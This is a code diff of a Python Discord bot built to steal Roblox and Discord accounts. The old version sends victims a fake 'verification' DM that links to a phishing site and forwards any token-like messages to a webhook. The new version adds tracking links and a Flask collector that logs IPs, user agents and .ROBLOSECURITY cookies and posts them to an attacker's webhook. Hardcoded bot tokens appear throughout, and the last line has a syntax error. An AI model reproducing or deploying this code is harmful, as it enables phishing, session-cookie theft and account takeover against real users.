@@ -1,52 +1,98 @@
 import discord
-from discord import app_commands
-import asyncio
+from discord.ext import commands
 import requests
+import sqlite3
 import json
-import random
-import string
+import os
+from datetime import datetime
+from flask import Flask, request
+from threading import Thread
 
-intents = discord.Intents.all()
-client = discord.Client(intents=intents)
-tree = app_commands.CommandTree(client)
+# --- CONFIG ---
+TOKEN = 'MTUzMDkwMTU2NTU4MDM3ODIxOA.G_LmaK.dWKdYsyKDSVyg1iG9xwZ7msmu3qR0OvHqmp-kQ'
+DB_FILE = 'logs.db'
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1528790141135487086/RoQZToMvlIYVvu6tpvhydaDqMZSLD2k0o-LDYZoXCRgxcvveaoUedCpnVG3zeG2udlOD"  # Replace
-PHISH_SITE = "http://your-hosted-phish-site.com/login"  # Host this yourself (instructions below)
+# --- GLOBALS ---
+target_webhook = None
+target_channel = None
+mode = None  # 'image' or 'cookie'
 
-def send_to_webhook(data):
-    payload = {"content": f"**NEW STEAL**\n```json\n{json.dumps(data, indent=2)}\n```"}
-    requests.post(WEBHOOK_URL, json=payload)
+# --- DB INIT ---
+conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS clicks
+             (user_id TEXT, username TEXT, timestamp TEXT, ip TEXT, user_agent TEXT, roblox_cookie TEXT)''')
+conn.commit()
 
-@client.event
+# --- BOT SETUP ---
+bot = commands.Bot(command_prefix='§', intents=discord.Intents.all())
+
+@bot.event
 async def on_ready():
-    await tree.sync()
-    print(f"🚀 Stealer bot online as {client.user}")
+    print(f'Logged in as {bot.user}')
 
-@tree.command(name="steal", description="Steal target's Roblox + Discord")
-@app_commands.describe(target="The victim")
-async def steal(interaction: discord.Interaction, target: discord.Member):
-    if target.bot:
-        await interaction.response.send_message("Can't steal bots dumbass", ephemeral=True)
+@bot.command()
+async def v2webhook(ctx, webhook_url: str):
+    global target_webhook
+    target_webhook = webhook_url
+    await ctx.send("use §v2channel *channel id*")
+
+@bot.command()
+async def v2channel(ctx, channel_id: int):
+    global target_channel
+    target_channel = bot.get_channel(channel_id)
+    if target_channel is None:
+        await ctx.send("Invalid channel ID")
         return
+    await ctx.send("now last step use §v2create image or §v2create cookie")
 
-    embed = discord.Embed(
-        title="🔐 Roblox × Discord Verification Required",
-        description=f"Hey {target.mention}, your account needs re-verification.\nClick below to continue.",
-        color=0x00ff00
-    )
-    embed.set_thumbnail(url="https://i.imgur.com/roblox-discord-logo.png")  # fake logo
-    view = discord.ui.View()
-    button = discord.ui.Button(label="Verify Now", style=discord.ButtonStyle.green, url=PHISH_SITE + f"?user={target.id}")
-    view.add_item(button)
+@bot.command()
+async def v2create(ctx, choice: str, *, arg=None):
+    global mode
+    if choice.lower() == 'image':
+        mode = 'image'
+        image_url = arg if arg else "https://example.com/fake.png"
+        tracking_url = f"https://your-server.com/collect?user_id={ctx.author.id}&guild={ctx.guild.id}&mode=image&img={image_url}"
+        embed = discord.Embed(title="Click to view image", color=0xff0000)
+        embed.set_image(url=tracking_url)
+        await ctx.send(embed=embed)
+    elif choice.lower() == 'cookie':
+        mode = 'cookie'
+        link = "https://docs.google.com/forms/d/e/1FAIpQLSd3Z-z2n9uCrzfkdItJZnVJnLpw5nXUZheSWjnje3WYaibt4g/viewform"
+        tracking_url = f"https://your-server.com/collect?user_id={ctx.author.id}&guild={ctx.guild.id}&mode=cookie&redirect={link}"
+        await ctx.send(f"Click here: {tracking_url}")
+    else:
+        await ctx.send("Invalid choice. Use image or cookie.")
 
-    await interaction.response.send_message("Steal command sent!", ephemeral=True)
-    await target.send(embed=embed, view=view)
+# --- FLASK WEBHOOK RECEIVER ---
+app = Flask(__name__)
 
-# Optional: Token logger if they open in browser with Discord
-@client.event
-async def on_message(message):
-    if "token" in message.content.lower() or "eyJ" in message.content:  # Discord token patterns
-        send_to_webhook({"discord_token": message.content, "from": str(message.author)})
-    await client.process_commands(message)  # if using commands
+@app.route('/collect', methods=['GET'])
+def collect():
+    user_id = request.args.get('user_id')
+    mode_param = request.args.get('mode', 'unknown')
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent')
+    timestamp = datetime.utcnow().isoformat()
+    cookie = request.cookies.get('.ROBLOSECURITY', 'Not provided')
+    # Save to DB
+    c.execute("INSERT INTO clicks (user_id, username, timestamp, ip, user_agent, roblox_cookie) VALUES (?, ?, ?, ?, ?, ?)",
+              (user_id, 'unknown', timestamp, ip, ua, cookie))
+    conn.commit()
+    # Send to Discord via webhook if set
+    if target_webhook:
+        data = {
+            "content": f"**CLICK** User {user_id} | IP {ip} | UA {ua} | Cookie: {cookie[:20]}... | Mode: {mode_param}"
+        }
+        requests.post(target_webhook, json=data)
+    # Redirect or serve pixel
+    if mode_param == 'cookie':
+        redirect_url = request.args.get('redirect', 'https://example.com')
+        return f'<script>window.location.href="{redirect_url}"</script>', 200, {'Content-Type': 'text/html'}
+    else:
+        return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'}
 
-client.run("MTUzMDI2MTA1MzYzODgzNjM0Nw.Gqt8Aa.w36eCniO9HAResq-xSdrqb1I3THS4ZvJ3YCmgM")
+# --- RUN ---
+if __name__ == '__main__':
+    Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False)).start()
+    bot.run(MTUzMDkwMTU2NTU4MDM3ODIxOA.G_LmaK.dWKdYsyKDSVyg1iG9xwZ7msmu3qR0OvHqmp-kQ)
